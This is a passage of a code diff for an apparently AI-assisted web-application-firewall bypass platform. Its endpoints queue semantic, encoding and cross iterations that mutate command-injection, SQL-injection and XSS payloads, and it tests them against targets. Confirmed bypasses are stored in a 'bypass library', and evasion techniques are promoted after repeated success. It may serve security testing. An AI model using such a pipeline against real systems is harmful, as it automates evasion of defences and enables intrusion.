+    semantic = semantic_model_config()
+    if _llm_config_complete(semantic):
+        return semantic
+    return verify
+
+
+def _derive_labels(verdict: dict[str, Any]) -> list[str]:
+    """由 verdict 派生标签列表（绕过状态 + 验证状态）。"""
+    labels: list[str] = []
+    bypass = verdict.get("bypass_verdict")
+    execution = verdict.get("execution_verdict")
+    if bypass == "bypass":
+        labels.append("绕过成功")
+    elif bypass == "block":
+        labels.append("绕过失败")
+    # bypass == "error" 不追加绕过标签
+    if execution == "confirmed":
+        labels.append("验证成功")
+    elif execution == "not_confirmed":
+        labels.append("验证失败")
+    elif execution == "unverified":
+        labels.append("未验证")
+    return labels
+
+
+def _update_payload_labels(
+    connection: sqlite3.Connection,
+    base_payload_id: str,
+    verdict: dict[str, Any],
+) -> None:
+    """更新源 payload 的「绕过状态/验证状态」标签（保留其余标签）。"""
+    if not base_payload_id:
+        return
+    record = connection.execute(
+        "SELECT labels_json FROM payloads WHERE id = ?", (base_payload_id,)
+    ).fetchone()
+    if not record:
+        return
+    existing = json_value(record["labels_json"], [])
+    # 去掉旧的「绕过/验证」状态标签，保留 severity/is_executable 等（本系统这些不在 labels 里）。
+    status_labels = {"绕过成功", "绕过失败", "验证成功", "验证失败", "未绕过", "未验证"}
+    kept = [label for label in existing if label not in status_labels]
+    merged = kept + _derive_labels(verdict)
+    # 去重保序
+    seen: set[str] = set()
+    final: list[str] = []
+    for label in merged:
+        if label not in seen:
+            seen.add(label)
+            final.append(label)
+    connection.execute(
+        "UPDATE payloads SET labels_json = ? WHERE id = ?",
+        (json.dumps(final, ensure_ascii=False), base_payload_id),
+    )
+
+
+def _record_observation(
+    connection: sqlite3.Connection,
+    job: dict[str, Any],
+    base: dict[str, Any],
+    evidence: TargetEvidence,
+    verdict: dict[str, Any],
+    timestamp: str,
+) -> None:
+    """插入一条不可变历史观测。"""
+    bypass_success = 1 if verdict.get("bypass_verdict") == "bypass" else 0
+    verification_success = 1 if verdict.get("execution_verdict") == "confirmed" else 0
+    labels = _derive_labels(verdict)
+    raw_evidence = {
+        "target_key": evidence.target_key,
+        "request_summary": evidence.request_summary,
+        "http_status": evidence.http_status,
+        "response_excerpt": evidence.response_excerpt,
+        "response_headers": evidence.response_headers,
+        "outcome": evidence.outcome,
+        "evidence": evidence.evidence,
+        "baseline_excerpt": evidence.baseline_excerpt,
+    }
+    connection.execute(
+        """
+        INSERT INTO kb_observations (
+            id, source_payload_id, source_agent, source_candidate_id, candidate_kind,
+            vulnerability, target_key, bypass_success, verification_success, labels_json,
+            failure_stage, raw_evidence_json, verdict_json, target_profile_json,
+            waf_policy_version, backend_version, created_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, NULL, NULL, ?)
+        """,
+        (
+            str(uuid.uuid4()),
+            base.get("id", ""),
+            job["source_agent"],
+            job["source_candidate_id"],
+            job["candidate_kind"],
+            job["vulnerability"],
+            evidence.target_key,
+            bypass_success,
+            verification_success,
+            json.dumps(labels, ensure_ascii=False),
+            verdict.get("failure_stage"),
+            json.dumps(raw_evidence, ensure_ascii=False),
+            json.dumps(verdict, ensure_ascii=False),
+            timestamp,
+        ),
+    )
+
+
+def _candidate_group(job: dict[str, Any]) -> str:
+    """判断 candidate 所属层：编码层 / 语义层。"""
+    return "encoding" if job["candidate_kind"] == "encoding_candidates" else "semantic"
+
+
+def _promote_techniques(
+    connection: sqlite3.Connection,
+    job: dict[str, Any],
+    verdict: dict[str, Any],
+    timestamp: str,
+) -> None:
+    """双成功时，按「漏洞类型 + 层」聚合，给同层同类型的所有技巧 success_count+1。
+
+    累计 ≥3 次 → status=promoted（三次独立双成功才转正）。
+    """
+    bypass_success = verdict.get("bypass_verdict") == "bypass"
+    verification_success = verdict.get("execution_verdict") == "confirmed"
+    if not (bypass_success and verification_success):
+        return
+    group = _candidate_group(job)
+    vulnerability = job["vulnerability"]
+    records = connection.execute(
+        "SELECT id, technique_id, success_count FROM kb_techniques WHERE vulnerability = ?",
+        (vulnerability,),
+    ).fetchall()
+    for record in records:
+        if technique_group(record["technique_id"]) != group:
+            continue
+        new_count = (record["success_count"] or 0) + 1
+        connection.execute(
+            """
+            UPDATE kb_techniques
+            SET success_count = ?,
+                status = CASE WHEN ? >= 3 THEN 'promoted' ELSE status END,
+                updated_at = ?
+            WHERE id = ?
+            """,
+            (new_count, new_count, timestamp, record["id"]),
+        )
+
+
+def _prune_techniques(
+    connection: sqlite3.Connection,
+    reason: str = "信息不足（从未被任何候选检验关联）",
+) -> int:
+    """剪枝：把从未被任何 observation 关联、且无成功记录的 pending 技巧标记为 pruned。
+
+    返回剪枝数量。
+    """
+    timestamp = utc_now()
+    # 从未在 kb_observations 里出现的技巧 ID（按 vulnerability+维度聚合关联，无法精确到 ID，
+    # 这里用「success_count=0 且 status=pending」作为「信息不足」的代理判定）。
+    records = connection.execute(
+        "SELECT id, technique_id, vulnerability FROM kb_techniques WHERE status = 'pending' AND success_count = 0"
+    ).fetchall()
+    pruned = 0
+    for record in records:
+        connection.execute(
+            "UPDATE kb_techniques SET status = 'pruned', updated_at = ? WHERE id = ?",
+            (timestamp, record["id"]),
+        )
+        connection.execute(
+            """
+            INSERT INTO kb_prune_events (
+                id, technique_id, primitive, reason, metadata_json, version, created_at
+            ) VALUES (?, ?, NULL, ?, ?, 'v1', ?)
+            """,
+            (
+                str(uuid.uuid4()),
+                record["technique_id"],
+                reason,
+                json.dumps({"vulnerability": record["vulnerability"]}, ensure_ascii=False),
+                timestamp,
+            ),
+        )
+        pruned += 1
+    return pruned
+
+
+def _prune_event_view(source: sqlite3.Row | dict[str, Any]) -> dict[str, Any]:
+    item = dict(source)
+    item["metadata"] = json_value(item.pop("metadata_json", None), {})
+    return item
+
+
+def _persist_verification_result(
+    connection: sqlite3.Connection,
+    job: dict[str, Any],
+    evidence: TargetEvidence,
+    verdict: dict[str, Any],
+    base: dict[str, Any] | None = None,
+) -> None:
+    """写入 job 的 verdict，并同步 bypass/block 库（同一事务，幂等）。"""
+    timestamp = utc_now()
+    raw_evidence = {
+        "target_key": evidence.target_key,
+        "request_summary": evidence.request_summary,
+        "http_status": evidence.http_status,
+        "response_excerpt": evidence.response_excerpt,
+        "response_headers": evidence.response_headers,
+        "outcome": evidence.outcome,
+        "evidence": evidence.evidence,
+        "baseline_excerpt": evidence.baseline_excerpt,
+    }
+    verdict_json = json.dumps(verdict, ensure_ascii=False)
+    failure_stage = verdict.get("failure_stage")
+    # 1. 落不可变历史观测
+    _record_observation(connection, job, base or {}, evidence, verdict, timestamp)
+    # 2. 更新源 payload 标签
+    if base and base.get("id"):
+        _update_payload_labels(connection, base["id"], verdict)
+    # 2.5 技巧转正回写（双成功时）
+    _promote_techniques(connection, job, verdict, timestamp)
+    # 3. 投影到 bypass/block/unverified 库
+    library_record_id = _sync_verification_library(
+        connection, job, evidence, verdict, timestamp
+    )
+    connection.execute(
+        """
+        UPDATE verification_jobs
+        SET status = 'completed',
+            target_key = ?,
+            raw_evidence_json = ?,
+            verdict_json = ?,
+            bypass_verdict = ?,
+            execution_verdict = ?,
+            failure_stage = ?,
+            library_record_id = ?,
+            error_message = NULL,
+            completed_at = ?
+        WHERE id = ?
+        """,
+        (
+            evidence.target_key,
+            json.dumps(raw_evidence, ensure_ascii=False),
+            verdict_json,
+            verdict.get("bypass_verdict"),
+            verdict.get("execution_verdict"),
+            failure_stage,
+            library_record_id,
+            timestamp,
+            job["id"],
+        ),
+    )
+
+
+def _sync_verification_library(
+    connection: sqlite3.Connection,
+    job: dict[str, Any],
+    evidence: TargetEvidence,
+    verdict: dict[str, Any],
+    timestamp: str,
+) -> str | None:
+    """按判定结果把 candidate 写入 bypass/block/unverified 三库之一，返回库记录 id。"""
+    agent = job["source_agent"]
+    candidate_id = job["source_candidate_id"]
+    name = f"{_agent_label(agent)} · {payload_internal_name(job['payload_snapshot'])}"
+    provenance = {
+        "base_payload_id": job.get("base_name", ""),
+        "verification_job_id": job["id"],
+        "target_key": evidence.target_key,
+        "request_summary": evidence.request_summary,
+    }
+    provenance_json = json.dumps(provenance, ensure_ascii=False)
+    confidence = float(verdict.get("confidence", 0.0))
+    rationale = verdict.get("rationale", "")
+
+    execution = verdict.get("execution_verdict")
+    bypass_success = 1 if verdict.get("bypass_verdict") == "bypass" else 0
+    verification_success = 1 if execution == "confirmed" else 0
+    labels = _derive_labels(verdict)
+    labels_json = json.dumps(labels, ensure_ascii=False)
+    is_bypass = bool(bypass_success and verification_success)
+    is_unverified = execution == "unverified"
+
+    # 统一清理对侧库，保证三库互斥。
+    def _clear_other_libraries() -> None:
+        for table in ("bypass_library", "block_library", "unverified_library"):
+            connection.execute(
+                f"DELETE FROM {table} WHERE source_agent = ? AND source_candidate_id = ?",
+                (agent, candidate_id),
+            )
+
+    if is_unverified:
+        record_id = str(uuid.uuid4())
+        _clear_other_libraries()
+        connection.execute(
+            """
+            INSERT INTO unverified_library (
+                id, source_agent, source_candidate_id, candidate_kind, name,
+                vulnerability, delivery, target_key, content, confidence, rationale,
+                provenance_json, verification_job_id, target_profile_id, created_at, updated_at
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)
+            ON CONFLICT(source_agent, source_candidate_id) DO UPDATE SET
+                name = excluded.name,
+                vulnerability = excluded.vulnerability,
+                delivery = excluded.delivery,
+                target_key = excluded.target_key,
+                content = excluded.content,
+                confidence = excluded.confidence,
+                rationale = excluded.rationale,
+                provenance_json = excluded.provenance_json,
+                verification_job_id = excluded.verification_job_id,
+                target_profile_id = excluded.target_profile_id,
+                updated_at = excluded.updated_at
+            """,
+            (
+                record_id,
+                agent,
+                candidate_id,
+                job["candidate_kind"],
+                name,
+                job["vulnerability"],
+                job["delivery"],
+                evidence.target_key,
+                job["payload_snapshot"],
+                confidence,
+                rationale,
+                provenance_json,
+                job["id"],
+                timestamp,
+                timestamp,
+            ),
+        )
+        return record_id
+
+    if is_bypass:
+        record_id = str(uuid.uuid4())
+        _clear_other_libraries()
+        connection.execute(
+            """
+            INSERT INTO bypass_library (
+                id, source_agent, source_candidate_id, candidate_kind, name,
+                vulnerability, delivery, target_key, content, confidence, rationale,
+                provenance_json, bypass_success, verification_success, labels_json,
+                verification_job_id, target_profile_id, created_at, updated_at
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)
+            ON CONFLICT(source_agent, source_candidate_id) DO UPDATE SET
+                name = excluded.name,
+                vulnerability = excluded.vulnerability,
+                delivery = excluded.delivery,
+                target_key = excluded.target_key,
+                content = excluded.content,
+                confidence = excluded.confidence,
+                rationale = excluded.rationale,
+                provenance_json = excluded.provenance_json,
+                bypass_success = excluded.bypass_success,
+                verification_success = excluded.verification_success,
+                labels_json = excluded.labels_json,
+                verification_job_id = excluded.verification_job_id,
+                target_profile_id = excluded.target_profile_id,
+                updated_at = excluded.updated_at
+            """,
+            (
+                record_id,
+                agent,
+                candidate_id,
+                job["candidate_kind"],
+                name,
+                job["vulnerability"],
+                job["delivery"],
+                evidence.target_key,
+                job["payload_snapshot"],
+                confidence,
+                rationale,
+                provenance_json,
+                bypass_success,
+                verification_success,
+                labels_json,
+                job["id"],
+                timestamp,
+                timestamp,
+            ),
+        )
+        return record_id
+
+    failure_stage = verdict.get("failure_stage") or "check_error"
+    record_id = str(uuid.uuid4())
+    _clear_other_libraries()
+    connection.execute(
+        """
+        INSERT INTO block_library (
+            id, source_agent, source_candidate_id, candidate_kind, name,
+            vulnerability, delivery, target_key, content, failure_stage, confidence,
+            rationale, provenance_json, bypass_success, verification_success, labels_json,
+            verification_job_id, target_profile_id, created_at, updated_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)
+        ON CONFLICT(source_agent, source_candidate_id) DO UPDATE SET
+            name = excluded.name,
+            vulnerability = excluded.vulnerability,
+            delivery = excluded.delivery,
+            target_key = excluded.target_key,
+            content = excluded.content,
+            failure_stage = excluded.failure_stage,
+            confidence = excluded.confidence,
+            rationale = excluded.rationale,
+            provenance_json = excluded.provenance_json,
+            bypass_success = excluded.bypass_success,
+            verification_success = excluded.verification_success,
+            labels_json = excluded.labels_json,
+            verification_job_id = excluded.verification_job_id,
+            target_profile_id = excluded.target_profile_id,
+            updated_at = excluded.updated_at
+        """,
+        (
+            record_id,
+            agent,
+            candidate_id,
+            job["candidate_kind"],
+            name,
+            job["vulnerability"],
+            job["delivery"],
+            evidence.target_key,
+            job["payload_snapshot"],
+            failure_stage,
+            confidence,
+            rationale,
+            provenance_json,
+            bypass_success,
+            verification_success,
+            labels_json,
+            job["id"],
+            timestamp,
+            timestamp,
+        ),
+    )
+    return record_id
+
+
+def _agent_label(agent: str) -> str:
+    return {"semantic": "语义迭代", "encoding": "编码迭代", "cross": "交叉迭代"}.get(agent, agent)
+
+
+def _fail_verification_job(job: dict[str, Any], message: str) -> None:
+    """把 job 标记为 failed 并同步到 block_library（check_error）。"""
+    with DB_LOCK:
+        connection = sqlite3.connect(DB_PATH)
+        connection.row_factory = sqlite3.Row
+        try:
+            evidence = TargetEvidence(
+                target_key=job.get("target_key") or "",
+                vulnerability=job["vulnerability"],
+                request_summary="",
+                http_status=0,
+                response_excerpt="",
+                outcome="request_error",
+                evidence=message,
+            )
+            verdict = normalize_verdict(None, "request_error")
+            verdict["rationale"] = message
+            connection.execute(
+                """
+                UPDATE verification_jobs
+                SET status = 'failed', error_message = ?, completed_at = ?,
+                    bypass_verdict = 'error', execution_verdict = 'not_confirmed',
+                    failure_stage = 'check_error'
+                WHERE id = ?
+                """,
+                (message[:1000], utc_now(), job["id"]),
+            )
+            _sync_verification_library(connection, job, evidence, verdict, utc_now())
+            connection.commit()
+        finally:
+            connection.close()
+
+
 @app.get("/")
 async def root():
     """Health check endpoint."""
@@ -1730,18 +3410,17 @@ def dashboard_summary():
 # Payload CRUD endpoints
 @app.get("/api/payloads")
 def list_payloads(
+    vulnerability: str | None = Query(default=None),
     limit: int | None = Query(default=None, ge=1, le=MAX_PAGE_SIZE),
     cursor: int = Query(default=0, ge=0),
 ):
-    return paged_payload_response(
-        """
-        SELECT * FROM payloads
-        WHERE is_deleted = 0 AND is_pool_snapshot = 0
-        ORDER BY created_at DESC
-        """,
-        limit,
-        cursor,
-    )
+    sql = "SELECT * FROM payloads WHERE is_deleted = 0 AND is_pool_snapshot = 0"
+    params: tuple[Any, ...] = ()
+    if vulnerability:
+        sql += " AND vulnerability = ?"
+        params = (vulnerability,)
+    sql += " ORDER BY created_at DESC"
+    return paged_payload_response(sql, limit, cursor, params)
 
 
 @app.get("/api/payloads/{payload_id}")
@@ -1766,11 +3445,9 @@ async def get_payload(payload_id: str):
 @app.patch("/api/payloads/{payload_id}")
 async def update_payload(payload_id: str, payload: dict):
     editable_fields = {
-        "name",
         "content",
         "delivery",
-        "usage_method",
-        "success_indicators",
+        "severity",
     }
     unknown_fields = set(payload) - editable_fields
     if unknown_fields:
@@ -1786,6 +3463,8 @@ async def update_payload(payload_id: str, payload: dict):
         if not isinstance(value, str) or not value.strip():
             raise HTTPException(status_code=422, detail=f"{field} must not be empty")
         updates[field] = value.strip() if field != "content" else value
+    if "severity" in updates and updates["severity"] not in PAYLOAD_SEVERITIES:
+        raise HTTPException(status_code=422, detail="severity must be one of: 低危, 中危, 高危, 严重")
 
     with DB_LOCK:
         connection = sqlite3.connect(DB_PATH)
@@ -1873,14 +3552,7 @@ async def delete_payload(payload_id: str) -> None:
 @app.post("/api/payloads", status_code=201)
 async def create_payload(payload: dict):
     """Create a new payload."""
-    required_fields = {
-        "name",
-        "vulnerability",
-        "delivery",
-        "content",
-        "usage_method",
-        "success_indicators",
-    }
+    required_fields = {"vulnerability", "severity", "delivery", "content"}
     missing_fields = [
         field
         for field in sorted(required_fields)
@@ -1893,20 +3565,25 @@ async def create_payload(payload: dict):
         )
     if payload["vulnerability"] not in VULNERABILITIES:
         raise HTTPException(status_code=422, detail="Unknown vulnerability type")
+    if payload["severity"] not in PAYLOAD_SEVERITIES:
+        raise HTTPException(status_code=422, detail="severity must be one of: 低危, 中危, 高危, 严重")
 
     payload_id = str(uuid.uuid4())
     timestamp = utc_now()
     values_by_column = {
         "id": payload_id,
         "vulnerability": payload["vulnerability"],
-        "name": payload["name"].strip(),
-        "category": str(payload.get("category", "")),
+        "name": payload_internal_name(payload["content"]),
+        "category": "",
         "delivery": payload["delivery"].strip(),
-        "target": str(payload.get("target", "")),
-        "difficulty": str(payload.get("difficulty", "")),
+        "target": "",
+        "difficulty": "",
+        "severity": payload["severity"],
+        "is_executable": 1,
         "content": payload["content"],
-        "usage_method": payload["usage_method"],
-        "success_indicators": payload["success_indicators"],
+        "usage_method": "",
+        "success_indicators": "",
+        "labels_json": '["未绕过","未验证"]',
         "created_at": timestamp,
     }
 
@@ -1974,6 +3651,75 @@ async def archive_candidate(candidate_id: str):
     return archive_candidate_record("semantic", candidate_id)
 
 
+@app.post("/api/semantic-iterations", status_code=202)
+async def create_semantic_iteration(
+    body: SemanticIterationRequest,
+    background_tasks: BackgroundTasks,
+):
+    with DB_LOCK:
+        connection = sqlite3.connect(DB_PATH)
+        connection.row_factory = sqlite3.Row
+        try:
+            payload_record = connection.execute(
+                "SELECT * FROM payloads WHERE id = ?", (body.base_payload_id,)
+            ).fetchone()
+            if not payload_record:
+                raise HTTPException(status_code=404, detail="Base Payload not found")
+            payload = dict(payload_record)
+            if payload["vulnerability"] not in SEMANTIC_PART_VULNERABILITIES:
+                raise HTTPException(
+                    status_code=422,
+                    detail="This vulnerability is not supported by the semantic part engine",
+                )
+            parsed, context = semantic_task_context(payload)
+            if len(context["available_directions"]) < body.candidate_count:
+                raise HTTPException(
+                    status_code=409,
+                    detail=f"Only {len(context['available_directions'])} semantic directions remain",
+                )
+            config = semantic_model_config()
+            task_id = str(uuid.uuid4())
+            timestamp = utc_now()
+            rule_hints = [item["id"] for item in context["available_directions"]]
+            connection.execute(
+                """
+                INSERT INTO generation_tasks (
+                    id, base_payload_id, status, provider, model, rule_hints_json,
+                    error_message, created_at, completed_at, candidate_count,
+                    direction_context_json, base_parts_json, parser_confidence,
+                    parser_status, unsupported_reason
+                ) VALUES (?, ?, 'queued', ?, ?, ?, NULL, ?, NULL, ?, ?, ?, ?, ?, ?)
+                """,
+                (
+                    task_id,
+                    payload["id"],
+                    config["provider"],
+                    config["model"],
+                    json.dumps(rule_hints, ensure_ascii=False),
+                    timestamp,
+                    body.candidate_count,
+                    json.dumps(context, ensure_ascii=False),
+                    json.dumps(parsed["parts"], ensure_ascii=False),
+                    parsed.get("confidence", 0),
+                    parsed.get("status", "supported"),
+                    parsed.get("unsupported_reason"),
+                ),
+            )
+            connection.commit()
+        except HTTPException:
+            connection.rollback()
+            raise
+        finally:
+            connection.close()
+
+    background_tasks.add_task(run_semantic_generation, task_id)
+    return {
+        "id": task_id,
+        "status": "queued",
+        "candidate_count": body.candidate_count,
+    }
+
+
 @app.get("/api/semantic-iterations/{task_id}")
 async def get_semantic_iteration(task_id: str):
     task = db_row("SELECT * FROM generation_tasks WHERE id = ?", (task_id,))
@@ -2037,6 +3783,64 @@ async def archive_encoding_candidate(candidate_id: str):
     return archive_candidate_record("encoding", candidate_id)
 
 
+@app.post("/api/encoding-iterations", status_code=202)
+async def create_encoding_iteration(
+    body: EncodingIterationRequest,
+    background_tasks: BackgroundTasks,
+):
+    with DB_LOCK:
+        connection = connect()
+        try:
+            payload_record = connection.execute(
+                "SELECT * FROM payloads WHERE id = ?", (body.base_payload_id,)
+            ).fetchone()
+            if not payload_record:
+                raise HTTPException(status_code=404, detail="Base Payload not found")
+            payload = dict(payload_record)
+            if payload["vulnerability"] not in {
+                "command-injection",
+                "sql-injection",
+                "xss",
+            }:
+                raise HTTPException(
+                    status_code=422,
+                    detail="The encoding iteration agent supports command injection, SQL injection, and XSS",
+                )
+            config = semantic_model_config()
+            task_id = str(uuid.uuid4())
+            timestamp = utc_now()
+            connection.execute(
+                """
+                INSERT INTO encoding_tasks (
+                    id, base_payload_id, status, provider, model,
+                    candidate_count, error_message, created_at, completed_at,
+                    direction_context_json
+                ) VALUES (?, ?, 'queued', ?, ?, ?, NULL, ?, NULL, '{}')
+                """,
+                (
+                    task_id,
+                    payload["id"],
+                    config["provider"],
+                    config["model"],
+                    body.candidate_count,
+                    timestamp,
+                ),
+            )
+            connection.commit()
+        except HTTPException:
+            connection.rollback()
+            raise
+        finally:
+            connection.close()
+
+    background_tasks.add_task(run_encoding_generation, task_id)
+    return {
+        "id": task_id,
+        "status": "queued",
+        "candidate_count": body.candidate_count,
+    }
+
+
 @app.get("/api/encoding-iterations/{task_id}")
 async def get_encoding_iteration(task_id: str):
     task = db_row("SELECT * FROM encoding_tasks WHERE id = ?", (task_id,))
@@ -2061,12 +3865,197 @@ async def get_encoding_iteration(task_id: str):
     return result
 
 
+@app.post("/api/cross-iterations", status_code=202)
+async def create_cross_iteration(
+    body: CrossIterationRequest,
+    background_tasks: BackgroundTasks,
+):
+    with DB_LOCK:
+        connection = connect()
+        try:
+            source_record = connection.execute(
+                "SELECT * FROM cross_sources WHERE id = ?", (body.cross_source_id,)
+            ).fetchone()
+            if not source_record:
+                raise HTTPException(status_code=404, detail="Cross iteration source not found")
+            source = dict(source_record)
+            task_id = str(uuid.uuid4())
+            timestamp = utc_now()
+            connection.execute(
+                """
+                INSERT INTO cross_tasks (
+                    id, cross_source_id, status, candidate_count, error_message,
+                    created_at, completed_at
+                ) VALUES (?, ?, 'queued', ?, NULL, ?, NULL)
+                """,
+                (task_id, source["id"], body.candidate_count, timestamp),
+            )
+            connection.commit()
+        except HTTPException:
+            connection.rollback()
+            raise
+        finally:
+            connection.close()
+
+    background_tasks.add_task(run_cross_generation, task_id)
+    return {
+        "id": task_id,
+        "status": "queued",
+        "candidate_count": body.candidate_count,
+    }
+
+
+@app.patch("/api/cross-candidates/{candidate_id}")
+async def update_cross_candidate(candidate_id: str, body: CandidateUpdateRequest):
+    if body.status not in CANDIDATE_STATUSES or body.status == "archived":
+        raise HTTPException(status_code=422, detail="Unknown candidate status")
+    with DB_LOCK:
+        connection = connect()
+        try:
+            record = connection.execute(
+                "SELECT * FROM cross_candidates WHERE id = ?", (candidate_id,)
+            ).fetchone()
+            if not record:
+                raise HTTPException(status_code=404, detail="Candidate not found")
+            candidate = dict(record)
+            transitions = {
+                "pending_test": {"test_success", "test_failed", "rejected"},
+                "test_success": {"pending_test"},
+                "test_failed": {"pending_test"},
+                "rejected": set(),
+                "archived": set(),
+            }
+            if body.status not in transitions.get(candidate["status"], set()):
+                raise HTTPException(
+                    status_code=409,
+                    detail="The current candidate status does not allow this transition",
+                )
+            connection.execute(
+                "UPDATE cross_candidates SET status = ?, test_note = ?, updated_at = ? WHERE id = ?",
+                (body.status, body.test_note, utc_now(), candidate_id),
+            )
+            connection.commit()
+        except HTTPException:
+            connection.rollback()
+            raise
+        finally:
+            connection.close()
+    record = db_row(
+        """
+        SELECT cross_candidates.*, cross_sources.name AS source_name,
+               cross_sources.vulnerability AS source_vulnerability,
+               cross_sources.target AS source_target,
+               cross_sources.difficulty AS source_difficulty,
+               cross_sources.delivery AS source_delivery,
+               cross_sources.content AS semantic_content,
+               cross_sources.rule_labels_json AS semantic_rule_labels_json
+        FROM cross_candidates
+        JOIN cross_sources ON cross_sources.id = cross_candidates.cross_source_id
+        WHERE cross_candidates.id = ?
+        """,
+        (candidate_id,),
+    )
+    return cross_candidate_view(record)
+
+
+@app.delete("/api/cross-candidates/{candidate_id}", status_code=204)
+async def delete_cross_candidate(candidate_id: str) -> None:
+    with DB_LOCK:
+        connection = connect()
+        try:
+            record = connection.execute(
+                "SELECT id FROM cross_candidates WHERE id = ?", (candidate_id,)
+            ).fetchone()
+            if not record:
+                raise HTTPException(status_code=404, detail="Candidate not found")
+            # 保留 cross_chain_history（链历史不被删除，避免重复生成）
+            connection.execute(
+                "DELETE FROM verification_jobs WHERE source_agent = 'cross' AND source_candidate_id = ?",
+                (candidate_id,),
+            )
+            connection.execute(
+                "DELETE FROM bypass_library WHERE source_agent = 'cross' AND source_candidate_id = ?",
+                (candidate_id,),
+            )
+            connection.execute(
+                "DELETE FROM block_library WHERE source_agent = 'cross' AND source_candidate_id = ?",
+                (candidate_id,),
+            )
+            connection.execute(
+                "DELETE FROM unverified_library WHERE source_agent = 'cross' AND source_candidate_id = ?",
+                (candidate_id,),
+            )
+            connection.execute("DELETE FROM cross_candidates WHERE id = ?", (candidate_id,))
+            connection.commit()
+        except HTTPException:
+            connection.rollback()
+            raise
+        finally:
+            connection.close()
+
+
 @app.get("/api/cross-sources")
 def list_cross_sources(
     limit: int | None = Query(default=None, ge=1, le=MAX_PAGE_SIZE),
     cursor: int = Query(default=0, ge=0),
 ):
     return paged_cross_source_response(limit, cursor)
+
+
+@app.post("/api/cross-sources/from-payload", status_code=201)
+async def create_cross_source_from_payload(payload: dict[str, Any]):
+    source_payload_id = str(payload.get("source_payload_id") or "").strip()
+    if not source_payload_id:
+        raise HTTPException(status_code=422, detail="source_payload_id is required")
+    timestamp = utc_now()
+    source_id = str(uuid.uuid4())
+    semantic_candidate_id = f"manual:{source_payload_id}"
+    with DB_LOCK:
+        connection = connect()
+        try:
+            source = connection.execute(
+                "SELECT * FROM payloads WHERE id = ? AND is_deleted = 0 AND is_pool_snapshot = 0",
+                (source_payload_id,),
+            ).fetchone()
+            if not source:
+                raise HTTPException(status_code=404, detail="Payload not found")
+            existing = connection.execute(
+                "SELECT id FROM cross_sources WHERE archived_payload_id = ?",
+                (source_payload_id,),
+            ).fetchone()
+            if existing:
+                raise HTTPException(status_code=409, detail="This Payload is already in the cross-iteration sources")
+            item = dict(source)
+            connection.execute(
+                """
+                INSERT INTO cross_sources (
+                    id, archived_payload_id, semantic_candidate_id, name,
+                    vulnerability, category, delivery, target, difficulty,
+                    content, rule_labels_json, created_at
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, '[]', ?)
+                """,
+                (
+                    source_id,
+                    source_payload_id,
+                    semantic_candidate_id,
+                    payload_internal_name(item["content"]),
+                    item["vulnerability"],
+                    item.get("category") or "",
+                    item["delivery"],
+                    item.get("target") or "",
+                    item.get("difficulty") or "",
+                    item["content"],
+                    timestamp,
+                ),
+            )
+            connection.commit()
+        except HTTPException:
+            connection.rollback()
+            raise
+        finally:
+            connection.close()
+    record = db_row("SELECT * FROM cross_sources WHERE id = ?", (source_id,))
+    return cross_source_view(record) if record else {}
 
 
 @app.get("/api/cross-candidates")
@@ -2260,8 +4249,8 @@ def add_iteration_pool_record(
                     id, name, vulnerability, category, delivery, target, difficulty,
                     content, created_at, archived_from_candidate_id, source_agent,
                     source_candidate_id, iteration_metadata_json, is_pool_snapshot,
-                    usage_method, success_indicators, is_deleted
-                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, NULL, NULL, ?, 1, '', '', 0)
+                    severity, is_executable, usage_method, success_indicators, is_deleted
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, NULL, NULL, ?, 1, ?, 1, '', '', 0)
                 """,
                 (
                     snapshot_id,
@@ -2274,6 +4263,7 @@ def add_iteration_pool_record(
                     payload["content"],
                     created_at,
                     payload.get("iteration_metadata_json") or "{}",
+                    payload.get("severity") or "中危",
                 ),
             )
             connection.execute(
@@ -2391,80 +4381,127 @@ async def start_iteration_pool_item(
             if not item_record:
                 raise HTTPException(status_code=404, detail="Iteration pool item not found")
             item = dict(item_record)
-            if item["agent"] != "semantic":
+            if item["agent"] not in {"semantic", "encoding"}:
                 raise HTTPException(
                     status_code=422,
-                    detail="This endpoint currently supports semantic iteration items",
+                    detail="Unknown iteration agent",
                 )
+
+            task_table = "generation_tasks" if item["agent"] == "semantic" else "encoding_tasks"
             if item["status"] == "started" and item.get("task_id"):
                 active = connection.execute(
-                    "SELECT status FROM generation_tasks WHERE id = ?", (item["task_id"],)
+                    f"SELECT status FROM {task_table} WHERE id = ?", (item["task_id"],)
                 ).fetchone()
                 if active and active["status"] in {"queued", "running"}:
                     raise HTTPException(status_code=409, detail="This iteration task is already running")
+
             payload_record = connection.execute(
                 "SELECT * FROM payloads WHERE id = ?", (item["snapshot_payload_id"],)
             ).fetchone()
             if not payload_record:
                 raise HTTPException(status_code=409, detail="Iteration snapshot not found")
             payload = dict(payload_record)
-            if payload["vulnerability"] not in SEMANTIC_PART_VULNERABILITIES:
-                raise HTTPException(
-                    status_code=422,
-                    detail="This vulnerability is not supported by the semantic part engine",
-                )
-            parsed, context = semantic_task_context(payload)
-            if len(context["available_directions"]) < body.candidate_count:
-                raise HTTPException(
-                    status_code=409,
-                    detail=f"Only {len(context['available_directions'])} semantic directions remain",
-                )
-            config = model_config()
-            task_id = str(uuid.uuid4())
+
             timestamp = utc_now()
-            rule_hints = [item["id"] for item in context["available_directions"]]
-            connection.execute(
-                """
-                INSERT INTO generation_tasks (
-                    id, base_payload_id, status, provider, model, rule_hints_json,
-                    error_message, created_at, completed_at, candidate_count,
-                    direction_context_json, base_parts_json, parser_confidence,
-                    parser_status, unsupported_reason
-                ) VALUES (?, ?, 'queued', ?, ?, ?, NULL, ?, NULL, ?, ?, ?, ?, ?, ?)
-                """,
-                (
-                    task_id,
-                    payload["id"],
-                    config["provider"],
-                    config["model"],
-                    json.dumps(rule_hints, ensure_ascii=False),
-                    timestamp,
-                    body.candidate_count,
-                    json.dumps(context, ensure_ascii=False),
-                    json.dumps(parsed["parts"], ensure_ascii=False),
-                    parsed.get("confidence", 0),
-                    parsed.get("status", "supported"),
-                    parsed.get("unsupported_reason"),
-                ),
